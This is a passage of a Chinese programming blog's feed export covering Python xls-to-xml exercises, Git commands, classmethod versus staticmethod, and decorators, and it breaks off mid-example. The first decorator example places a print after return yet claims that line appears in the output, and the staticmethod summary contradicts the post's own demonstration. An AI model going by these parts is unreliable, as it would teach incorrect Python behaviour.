<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> xlwt</div><div class="line"></div><div class="line"><span class="comment"># jsonstr to python dict data</span></div><div class="line"><span class="keyword">with</span> open(<span class="string">'numbers.txt'</span>) <span class="keyword">as</span> f:  </div><div class="line">    lists = json.loads(f.read())</div><div class="line"></div><div class="line">print(lists)</div><div class="line"><span class="comment"># create xls</span></div><div class="line">xls = xlwt.Workbook()</div><div class="line">table = xls.add_sheet(<span class="string">'numbers'</span>)</div><div class="line"></div><div class="line"><span class="comment"># write xls</span></div><div class="line">row = <span class="number">0</span></div><div class="line">col = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> lists:</div><div class="line">    col = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> k:</div><div class="line">        table.write(row, col, v)</div><div class="line">        col += <span class="number">1</span></div><div class="line">    row += <span class="number">1</span>    </div><div class="line"><span class="comment"># save to xls</span></div><div class="line">xls.save(<span class="string">'numbers.xls'</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0017-题"><a href="#第-0017-题" class="headerlink" title="第 0017 题"></a>第 0017 题</h1><p>第 0017 题：将 第 0014 题中的 student.xls 文件中的内容写到 student.xml 文件中，如下所示：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;root&gt;
&lt;students&gt;
&lt;!-- 
    学生信息表
    &quot;id&quot; : [名字, 数学, 语文, 英文]
--&gt;
{
    &quot;1&quot; : [&quot;张三&quot;, 150, 120, 100],
    &quot;2&quot; : [&quot;李四&quot;, 90, 99, 95],
    &quot;3&quot; : [&quot;王五&quot;, 60, 66, 68]
}
&lt;/students&gt;
&lt;/root&gt;
</code></pre><p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</div><div class="line"><span class="keyword">import</span> xlrd</div><div class="line"></div><div class="line"><span class="comment"># read xls</span></div><div class="line">xls = xlrd.open_workbook(<span class="string">'student.xls'</span>)</div><div class="line">table = xls.sheet_by_name(<span class="string">'student'</span>)</div><div class="line"></div><div class="line">dicts = &#123;&#125;</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(table.nrows):</div><div class="line">    row = table.row_values(i)</div><div class="line">    dicts[row[<span class="number">0</span>]] = row[<span class="number">1</span>:]</div><div class="line"></div><div class="line"><span class="comment"># json.dumps无法解决dict的排序问题,所以手动拼接json string</span></div><div class="line">text = <span class="string">''</span></div><div class="line">text += <span class="string">'\n&#123;\n'</span></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> sorted(dicts.keys()):</div><div class="line">    lists = dicts[k]</div><div class="line">    s = <span class="string">"    \"%s\" : [\"%s\", %d, %d, %d],\n"</span> % (k, lists[<span class="number">0</span>], lists[<span class="number">1</span>], lists[<span class="number">2</span>], lists[<span class="number">3</span>])</div><div class="line">    text += s</div><div class="line">text += <span class="string">'&#125;\n'</span></div><div class="line">text = text[::<span class="number">-1</span>].replace(<span class="string">','</span>,<span class="string">''</span>,<span class="number">1</span>)[::<span class="number">-1</span>]  <span class="comment"># 翻转字符串，去掉第一个逗号，再翻转回来</span></div><div class="line"></div><div class="line"><span class="comment">#save to xml</span></div><div class="line">root = ET.Element(<span class="string">'root'</span>)</div><div class="line">students = ET.SubElement(root, <span class="string">'students'</span>)</div><div class="line">students.append(ET.Comment(<span class="string">u"""学生信息表  "id" : [名字, 数学, 语文, 英文]"""</span> ))</div><div class="line">students.text = text</div><div class="line">tree = ET.ElementTree(root)</div><div class="line">tree.write(<span class="string">'student.xml'</span>, encoding=<span class="string">'utf-8'</span>,  xml_declaration=<span class="keyword">True</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0018-题"><a href="#第-0018-题" class="headerlink" title="第 0018 题"></a>第 0018 题</h1><p>第 0018 题： 将 第 0015 题中的 city.xls 文件中的内容写到 city.xml 文件中，如下所示：</p>
<pre><code>&lt;?xmlversion=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;root&gt;
&lt;citys&gt;
&lt;!--
    城市信息
--&gt;
{
    &quot;1&quot; : &quot;上海&quot;,
    &quot;2&quot; : &quot;北京&quot;,
    &quot;3&quot; : &quot;成都&quot;
}
&lt;/citys&gt;
&lt;/root&gt;
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> xlrd</div><div class="line"></div><div class="line">xls = xlrd.open_workbook(<span class="string">'city.xls'</span>)</div><div class="line">table = xls.sheet_by_name(<span class="string">'city'</span>)</div><div class="line"></div><div class="line"><span class="comment"># get json string</span></div><div class="line">d = &#123;&#125;</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(table.nrows):</div><div class="line">    row = table.row_values(i)</div><div class="line">    d[row[<span class="number">0</span>]] = row[<span class="number">1</span>]</div><div class="line"></div><div class="line">json_str = json.dumps(d, ensure_ascii=<span class="keyword">False</span>)</div><div class="line"></div><div class="line"><span class="comment"># save to xml</span></div><div class="line">root = ET.Element(<span class="string">'root'</span>)</div><div class="line">citys = ET.SubElement(root, <span class="string">'citys'</span>)</div><div class="line">citys.append(ET.Comment(<span class="string">'城市信息'</span>))</div><div class="line">citys.text = json_str</div><div class="line">tree = ET.ElementTree(root)</div><div class="line">tree.write(<span class="string">'citys.xml'</span>, encoding = <span class="string">'utf-8'</span>, xml_declaration = <span class="keyword">True</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0019-题"><a href="#第-0019-题" class="headerlink" title="第 0019 题"></a>第 0019 题</h1><p>第 0019 题： 将 第 0016 题中的 numbers.xls 文件中的内容写到 numbers.xml 文件中，如下所示：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;root&gt;
&lt;numbers&gt;
&lt;!--
    数字信息
--&gt;

[
    [1, 82, 65535],
    [20, 90, 13],
    [26, 809, 1024]
]

&lt;/numbers&gt;
&lt;/root&gt;
</code></pre><p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> xlrd</div><div class="line"></div><div class="line">xls = xlrd.open_workbook(<span class="string">'numbers.xls'</span>)</div><div class="line">table = xls.sheet_by_name(<span class="string">'numbers'</span>)</div><div class="line"></div><div class="line"><span class="comment"># get json string</span></div><div class="line">l = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(table.nrows):</div><div class="line">    row = table.row_values(i)</div><div class="line">    l.append(row)</div><div class="line"></div><div class="line">json_str = json.dumps(l, ensure_ascii=<span class="keyword">False</span>)</div><div class="line">print(json_str)</div><div class="line"></div><div class="line"><span class="comment"># save to xml</span></div><div class="line">root = ET.Element(<span class="string">'root'</span>)</div><div class="line">citys = ET.SubElement(root, <span class="string">'numbers'</span>)</div><div class="line">citys.append(ET.Comment(<span class="string">'数字信息'</span>))</div><div class="line">citys.text = json_str</div><div class="line">tree = ET.ElementTree(root)</div><div class="line">tree.write(<span class="string">'numbers.xml'</span>, encoding = <span class="string">'utf-8'</span>, xml_declaration = <span class="keyword">True</span>)</div></pre></td></tr></table></figure>
<h1 id="第-0020-题"><a href="#第-0020-题" class="headerlink" title="第 0020 题"></a>第 0020 题</h1><p>第 0020 题： 登陆中国联通网上营业厅 后选择「自助服务」 –&gt; 「详单查询」，然后选择你要查询的时间段，点击「查询」按钮，查询结果页面的最下方，点击「导出」，就会生成类似于 2014年10月01日～2014年10月31日通话详单.xls 文件。写代码，对每月通话时间做个统计。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> xlrd</div><div class="line"></div><div class="line">xls = xlrd.open_workbook(<span class="string">'src.xls'</span>)</div><div class="line">table = xls.sheet_by_index(<span class="number">0</span>)</div><div class="line"></div><div class="line">total_time = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,table.nrows):</div><div class="line">    row = table.row_values(i)</div><div class="line">    total_time += int(row[<span class="number">3</span>])</div><div class="line"></div><div class="line">print(<span class="string">'total time : %d s'</span>  % total_time)</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python 编程练习&lt;/p&gt;
&lt;p&gt;python 每日编程训练。（本文使用Python 3.5）&lt;/p&gt;
&lt;p&gt;来源于 - &lt;a href=&quot;https://github.com/Yixiaohan/show-me-the-code&quot;&gt;https://github.com/Yixiaohan/show-me-the-code&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Python基础" scheme="https://maoao530.github.io/categories/Python%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Python" scheme="https://maoao530.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Git笔记</title>
    <link href="https://maoao530.github.io/2016/07/01/git-note/"/>
    <id>https://maoao530.github.io/2016/07/01/git-note/</id>
    <published>2016-07-01T14:22:24.000Z</published>
    <updated>2017-01-31T05:55:21.173Z</updated>
    
    <content type="html"><![CDATA[<p>好记性不如烂笔头，把常用的GIT命令在这里记录一下。</p>
<a id="more"></a>
<h1 id="一、Git流程图"><a href="#一、Git流程图" class="headerlink" title="一、Git流程图"></a>一、Git流程图</h1><p><img src="/img/archives/git.png" alt="Git流程"></p>
<ul>
<li>workspace: 本地的工作目录。（记作A）</li>
<li>index：缓存区域，临时保存本地改动。（记作B）</li>
<li>local repository: 本地仓库，只想最后一次提交HEAD。（记作C）</li>
<li>remote repository：远程仓库。（记作D）</li>
</ul>
<h1 id="二、新建"><a href="#二、新建" class="headerlink" title="二、新建"></a>二、新建</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git init                 //当前目录初始化为GIT代码库</div><div class="line">git init [project-name]  //新建一个目录，将其初始化为Git代码库</div><div class="line">git clone [url]          //检出</div><div class="line">git config --global user.email &quot;you@example.com&quot; //配置email</div><div class="line">git config --global user.name &quot;Name&quot; //配置用户名</div></pre></td></tr></table></figure>
<h1 id="三、操作"><a href="#三、操作" class="headerlink" title="三、操作"></a>三、操作</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">git add &lt;file&gt; // 文件添加，A → B</div><div class="line">git add . // 所有文件添加，A → B</div><div class="line">git commit -m &quot;代码提交信息&quot; //文件提交，B → C</div><div class="line">git commit --amend //与上次commit合并, *B → C</div><div class="line">git push origin master //推送至master分支, C → D</div><div class="line">git pull //更新本地仓库至最新改动， D → A</div><div class="line">git fetch //抓取远程仓库更新， D → C</div><div class="line">git log //查看提交记录</div><div class="line">git status //查看修改状态</div><div class="line">git diff//查看详细修改内容</div><div class="line">git show//显示某次提交的内容</div></pre></td></tr></table></figure>
<h1 id="四、撤销操作"><a href="#四、撤销操作" class="headerlink" title="四、撤销操作"></a>四、撤销操作</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">git reset &lt;file&gt;//某个文件索引会回滚到最后一次提交， C → B</div><div class="line">git reset//索引会回滚到最后一次提交， C → B</div><div class="line">git reset --hard // 索引会回滚到最后一次提交， C → B → A</div><div class="line">git checkout // 从index复制到workspace， B → A</div><div class="line">git checkout -- files // 文件从index复制到workspace， B → A</div><div class="line">git checkout HEAD -- files // 文件从local repository复制到workspace， C → A</div></pre></td></tr></table></figure>
<h1 id="五、分支相关"><a href="#五、分支相关" class="headerlink" title="五、分支相关"></a>五、分支相关</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">git checkout -b branch_name //创建名叫“branch_name”的分支，并切换过去</div><div class="line">git checkout master //切换回主分支</div><div class="line">git branch -d branch_name // 删除名叫“branch_name”的分支</div><div class="line">git push origin branch_name //推送分支到远端仓库</div><div class="line">git merge branch_name // 合并分支branch_name到当前分支(如master)</div><div class="line">git rebase //衍合，线性化的自动， D → A</div></pre></td></tr></table></figure>
<h1 id="六、冲突处理"><a href="#六、冲突处理" class="headerlink" title="六、冲突处理"></a>六、冲突处理</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git diff //对比workspace与index</div><div class="line">git diff HEAD //对于workspace与最后一次commit</div><div class="line">git diff &lt;source_branch&gt; &lt;target_branch&gt; //对比差异</div><div class="line">git add &lt;filename&gt; //修改完冲突，需要add以标记合并成功</div></pre></td></tr></table></figure>
<h1 id="七、其他"><a href="#七、其他" class="headerlink" title="七、其他"></a>七、其他</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git diff //对比workspace与index</div><div class="line">git diff HEAD //对于workspace与最后一次commit</div><div class="line">git diff &lt;source_branch&gt; &lt;target_branch&gt; //对比差异</div><div class="line">git add &lt;filename&gt; //修改完冲突，需要add以标记合并成功</div></pre></td></tr></table></figure>
<p>关于Git更详细可以参考：</p>
<p><a href="https://git-scm.com/book/zh/v2" target="_blank" rel="external">Git完整命令地址</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;好记性不如烂笔头，把常用的GIT命令在这里记录一下。&lt;/p&gt;
    
    </summary>
    
      <category term="其他" scheme="https://maoao530.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="Git" scheme="https://maoao530.github.io/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>python中的@classmethod和@staticmethod</title>
    <link href="https://maoao530.github.io/2016/05/17/python-classmethod-staticmethod/"/>
    <id>https://maoao530.github.io/2016/05/17/python-classmethod-staticmethod/</id>
    <published>2016-05-17T15:58:59.000Z</published>
    <updated>2017-01-31T07:13:33.435Z</updated>
    
    <content type="html"><![CDATA[<p>花两分钟了解什么是实例方法，类方法，静态方法。</p>
<a id="more"></a>
<h1 id="一、定义"><a href="#一、定义" class="headerlink" title="一、定义"></a>一、定义</h1><p>python中类方法和静态方法是用装饰器<code>@classmethod</code>和<code>@staticmethod</code>来定义的。</p>
<p><a href="https://maoao530.github.io/2016/05/17/python-decorator/">点我学习什么是装饰器</a></p>
<p>我们先来看一个简单的实例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(self,x)</span>:</span></div><div class="line">        <span class="keyword">print</span> (<span class="string">"executing foo(%s,%s)"</span>%(self,x))</div><div class="line"></div><div class="line"><span class="meta">    @classmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">class_foo</span><span class="params">(cls,x)</span>:</span></div><div class="line">        <span class="keyword">print</span> (<span class="string">"executing class_foo(%s,%s)"</span>%(cls,x))</div><div class="line"></div><div class="line"><span class="meta">    @staticmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">static_foo</span><span class="params">(x)</span>:</span></div><div class="line">        <span class="keyword">print</span> (<span class="string">"executing static_foo(%s)"</span>%x)</div></pre></td></tr></table></figure>
<p>我们定义了一个<code>class A</code>，类A里面分别定义了普通方法foo，<code>@classmethod</code>修饰的类方法class_foo，还有<code>@staticmethod</code>修饰的静态方法static_foo，那么他们之间有什么区别呢？<br>我们不妨来验证一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">a=A()</div><div class="line">print(a.foo)</div><div class="line">print(a.class_foo)</div><div class="line">print(a.static_foo)</div><div class="line"></div><div class="line"><span class="comment"># 输出结果</span></div><div class="line"><span class="comment"># &lt;bound method A.foo of &lt;__main__.A object at 0x0121B950&gt;&gt;</span></div><div class="line"><span class="comment"># &lt;bound method A.class_foo of &lt;class '__main__.A'&gt;&gt;</span></div><div class="line"><span class="comment"># &lt;function A.static_foo at 0x01222078&gt;</span></div></pre></td></tr></table></figure>
<p>我们从输出结果可以看到：</p>
<ul>
<li>foo是绑定在实例a上的，参数self便是实例a本身</li>
<li>class_foo是绑定在class A上的，参数cls指向class A本身</li>
<li>static_foo不绑定在a或者A上，所以没有额外的参数</li>
</ul>
<h1 id="二、使用"><a href="#二、使用" class="headerlink" title="二、使用"></a>二、使用</h1><p>那么使用上有什么区别呢？<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">a = A()</div><div class="line">a.foo(<span class="number">1</span>)</div><div class="line">a.class_foo(<span class="number">1</span>)</div><div class="line">a.static_foo(<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="comment"># A.foo(2) #error</span></div><div class="line">A.class_foo(<span class="number">2</span>)</div><div class="line">A.static_foo(<span class="number">2</span>)</div><div class="line"></div><div class="line"><span class="comment"># 输出结果</span></div><div class="line"><span class="comment"># executing foo(&lt;__main__.A object at 0x0121B950&gt;,1)</span></div><div class="line"><span class="comment"># executing class_foo(&lt;class '__main__.A'&gt;,1)</span></div><div class="line"><span class="comment"># executing static_foo(1)</span></div><div class="line"><span class="comment"># executing class_foo(&lt;class '__main__.A'&gt;,2)</span></div><div class="line"><span class="comment"># executing static_foo(2)</span></div></pre></td></tr></table></figure></p>
<p>从上面的代码我们可以看到，使用上的区别：</p>
<ul>
<li>foo是绑定在实例a上的，只能通过实例去调用</li>
<li>class_foo绑定在类A上，可以通过实例a或者类A去调用</li>
<li>static_foo不绑定任何参数，也可以通过实例a或者类A去调用</li>
</ul>
<h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>类和实例都是对象，所以它们可以有方法：</p>
<ul>
<li>实例的方法就叫实例方法。</li>
<li>类的方法就叫类方法。</li>
<li>静态方法就是写在类里的普通方法,必须用类来调用，比如说有一些跟类有关系的功能，但是运行的时候又不需要实例和类参与的函数，这个时候就可以用@staticmethod，因为如果写一堆全局函数，可能后续会变得难以维护。</li>
</ul>
<p>References：</p>
<ul>
<li><a href="https://taizilongxu.gitbooks.io/stackoverflow-about-python/content/14/README.html" target="_blank" rel="external">装饰器@staticmethod和@classmethod有什么区别?</a></li>
<li><a href="http://www.wklken.me/posts/2013/12/22/difference-between-staticmethod-and-classmethod-in-python.html" target="_blank" rel="external">[翻译]PYTHON中STATICMETHOD和CLASSMETHOD的差异</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;花两分钟了解什么是实例方法，类方法，静态方法。&lt;/p&gt;
    
    </summary>
    
      <category term="Python基础" scheme="https://maoao530.github.io/categories/Python%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Python" scheme="https://maoao530.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>python 装饰器decorator</title>
    <link href="https://maoao530.github.io/2016/05/17/python-decorator/"/>
    <id>https://maoao530.github.io/2016/05/17/python-decorator/</id>
    <published>2016-05-17T15:08:59.000Z</published>
    <updated>2017-01-31T07:14:48.541Z</updated>
    
    <content type="html"><![CDATA[<p>2分钟告诉你什么是python装饰器。</p>
<a id="more"></a>
<h1 id="一、什么是装饰器"><a href="#一、什么是装饰器" class="headerlink" title="一、什么是装饰器"></a>一、什么是装饰器</h1><p>Python的装饰器的英文名叫<code>Decorator</code>，这个和设计模式中的<code>Decorator Pattern</code>是两种东西。<br>Python中的装饰器主要用于对已经有的模块做一些“修饰工作”。比如说，我们经常需要在函数调用前后自动打印日志，又不想要改变原有函数的模块，这个时候，我们便可以写一个打印log的装饰器。</p>
<h1 id="二、Hello-World"><a href="#二、Hello-World" class="headerlink" title="二、Hello World"></a>二、Hello World</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 定义log装饰器</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(func)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kw)</span>:</span></div><div class="line">        print(<span class="string">'start %s()'</span> % func.__name__)</div><div class="line">        <span class="keyword">return</span> func(*args, **kw)</div><div class="line">        print(<span class="string">'end %s()'</span> % func.__name__)</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="meta">@log</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'foo function ...'</span>)</div><div class="line"></div><div class="line">foo()</div></pre></td></tr></table></figure>
<p>当运行代码，你会发现有如下输出：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">C:\Users\maoao\Desktop\Project&gt;python Test.py</div><div class="line">start foo()</div><div class="line">foo function ...</div><div class="line">end foo()</div></pre></td></tr></table></figure></p>
<p>有木有发现很神奇？</p>
<h1 id="三、Decorator-的本质"><a href="#三、Decorator-的本质" class="headerlink" title="三、Decorator 的本质"></a>三、Decorator 的本质</h1><p>对于Python的这个@注解语法糖来说，当你在用某个@decorator来修饰某个函数func时，如下所示:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@log</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'foo function ...'</span>)</div></pre></td></tr></table></figure></p>
<p>相当于执行了语句：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">foo = log(foo)</div></pre></td></tr></table></figure></p>
<p>其实就是把一个函数当参数传到另一个函数中，然后再把decorator这个函数的返回值赋值回了原来的func。</p>
<p>不信我们可以做如下验证：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(fn)</span>:</span></div><div class="line">    <span class="keyword">print</span> (<span class="string">"fuck %s ! "</span> % fn.__name__.upper())</div><div class="line"> </div><div class="line"><span class="meta">@fuck</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gfw</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure></p>
<p>还没有执行gfw就输出我们每个人的心声了有木有。</p>
<p>知道这点本质，当你看到有<strong>多个decorator</strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@decorator_one</span></div><div class="line"><span class="meta">@decorator_two</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure></p>
<p>相当于：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">func = decorator_one(decorator_two(func))</div></pre></td></tr></table></figure></p>
<p><strong>带参数的decorator</strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@decorator(arg1, arg2)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure></p>
<p>相当于：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">func = decorator(arg1,arg2)(func)</div></pre></td></tr></table></figure></p>
<p>这意味着decorator(arg1, arg2)这个函数需要返回一个“真正的decorator”。</p>
<h1 id="四、带参数的装饰器示例"><a href="#四、带参数的装饰器示例" class="headerlink" title="四、带参数的装饰器示例"></a>四、带参数的装饰器示例</h1><p>假设我们可以编写一个带参数的装饰器：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(text)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(func)</span>:</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kw)</span>:</span></div><div class="line">            print(<span class="string">'%s, start %s()'</span> % (text, func.__name__))</div><div class="line">            func(*args, **kw)</div><div class="line">            print(<span class="string">'%s, end %s()'</span> % (text, func.__name__))</div><div class="line">        wrapper.__name__ = func.__name__</div><div class="line">        <span class="keyword">return</span> wrapper</div><div class="line">    <span class="keyword">return</span> decorator</div><div class="line"></div><div class="line"><span class="meta">@log('SHUN_TAG')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'foo function ...'</span>)</div><div class="line"></div><div class="line">foo()</div><div class="line"><span class="keyword">print</span> foo.__name__</div><div class="line"></div><div class="line"><span class="comment"># 输出：</span></div><div class="line"></div><div class="line"><span class="comment"># C:\Users\maoao\Desktop\Project&gt;python Test.py</span></div><div class="line"><span class="comment"># SHUN_TAG, start foo()</span></div><div class="line"><span class="comment"># foo function ...</span></div><div class="line"><span class="comment"># SHUN_TAG, end foo()</span></div><div class="line"><span class="comment"># 